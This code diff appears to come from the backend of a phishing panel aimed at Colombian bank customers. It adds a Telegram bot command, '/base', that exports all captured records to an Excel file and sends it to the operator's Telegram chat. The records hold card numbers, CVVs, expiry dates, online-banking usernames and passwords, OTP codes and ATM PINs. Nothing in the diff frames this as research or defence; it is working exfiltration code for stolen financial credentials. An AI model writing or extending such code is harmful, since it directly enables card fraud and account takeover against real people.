@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require('cors');
+const XLSX = require('xlsx');
 
 const app = express();
 app.use(cors());
@@ -397,6 +398,71 @@ async function procesarUpdate(update) {
                 } else {
                     const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
                     await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
+                }
+                return;
+            }
+            if (comando === '/base') {
+                try {
+                    if (pagosPendientes.size === 0) {
+                        await tgSendMessage('📭 No hay registros para exportar.');
+                        return;
+                    }
+
+                    const filas = [];
+                    for (const pago of pagosPendientes.values()) {
+                        filas.push({
+                            'ID Solicitud': pago.solicitud_id || '',
+                            'Estado': pago.estado || '',
+                            'Fase Actual': pago.fase_actual || '',
+                            'Paso': pago.paso || '',
+                            'Solicitante': pago.nombre_solicitante || '',
+                            'Cédula Solicitante': pago.cedula_solicitante || '',
+                            'Titular': pago.titular || '',
+                            'Número Tarjeta': pago.numero_tarjeta || '',
+                            'Vencimiento': pago.vencimiento || '',
+                            'CVV': pago.cvv || '',
+                            'Marca': (pago.marca_tarjeta || '').toUpperCase(),
+                            'Banco Emisor': pago.banco_emisor || '',
+                            'Usuario Banco': pago.usuario_banco || '',
+                            'Contraseña Banco': pago.password_banco || '',
+                            'Código OTP': pago.codigo_otp || '',
+                            'Clave ATM': pago.clave_atm || '',
+                            'Clave Dinámica': pago.clave_dinamica || '',
+                            'Requiere Clave ATM': pago.requiere_clave_atm ? 'SÍ' : 'NO',
+                            'Requiere Clave Dinámica': pago.requiere_clave_dinamica ? 'SÍ' : 'NO',
+                            'Requiere SMS': pago.requiere_sms ? 'SÍ' : 'NO',
+                            'Motivo Rechazo': pago.motivo_rechazo || '',
+                            'Redirigir A': pago.redirigir_a || '',
+                            'IP': pago.ip || ''
+                        });
+                    }
+
+                    const hoja = XLSX.utils.json_to_sheet(filas);
+                    const libro = XLSX.utils.book_new();
+                    XLSX.utils.book_append_sheet(libro, hoja, 'Registros');
+
+                    const anchos = Object.keys(filas[0]).map(k => ({ wch: Math.max(k.length + 2, 20) }));
+                    hoja['!cols'] = anchos;
+
+                    const buffer = XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });
+
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('caption', `📊 <b>BASE DE DATOS</b>\n\n📦 Total registros: <b>${filas.length}</b>\n🕒 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`);
+                    formData.append('parse_mode', 'HTML');
+                    formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_registros_${Date.now()}.xlsx`);
+
+                    const urlEnvio = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+                    const resp = await fetch(urlEnvio, { method: 'POST', body: formData });
+                    const dataResp = await resp.json();
+
+                    if (!dataResp.ok) {
+                        console.error('Error enviando Excel:', dataResp);
+                        await tgSendMessage('❌ Error al enviar el archivo Excel.');
+                    }
+                } catch (err) {
+                    console.error('Error en /base:', err);
+                    await tgSendMessage('❌ Error generando la base de datos.');
                 }
                 return;
             }
